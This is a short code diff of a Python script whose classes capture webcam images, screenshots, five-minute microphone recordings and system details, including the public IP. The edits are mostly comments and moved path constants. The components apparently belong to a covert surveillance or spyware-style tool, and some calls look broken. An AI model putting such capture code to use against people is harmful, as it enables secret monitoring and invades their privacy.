@@ -12,8 +12,6 @@ import socket
 from requests import get
 import platform
 
-
-
 class WEBCAMERA:
     def webcamera(self):
         cap = VideoCapture(0)
@@ -31,7 +29,7 @@ class WEBCAMERA:
 
 class SCREENSHOTS:
     def __init__(self):
-        # Variables
+        # Constants for variables
         self.counter = 0
         self.sleepAmount = 1
 
@@ -57,10 +55,11 @@ class MICROPHONE:
         # Constants for audio settings
         self.sample_rate = 44100 # Normal wave length for normal sound quality
         self.duration = 300 #Duration in seconds
+
+        # Folder path and filename
+        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Soundfiles"
         self.output_file_name = "Soundfile.wav"
 
-        # Folder path
-        self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Soundfiles"
     def microphone(self):
         audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate = self.sample_rate, channels = 2)
 
@@ -77,8 +76,13 @@ class MICROPHONE:
 
 class SYS_INFO:
     def __init__(self):
+        # Folder path and filename
         self.folder_path = r"C:\Users\deniz\Skrivebord\TestMappe\Systeminformation"
+        self.output_file_name = "systeminfo.txt"
+
+        # Public IP website link
         self.public_ip_link = "https://api.ipify.org"
+
     def system_information(self):
         with open(self.folder_path, "a") as f:
             hostname = socket.gethostbyname()
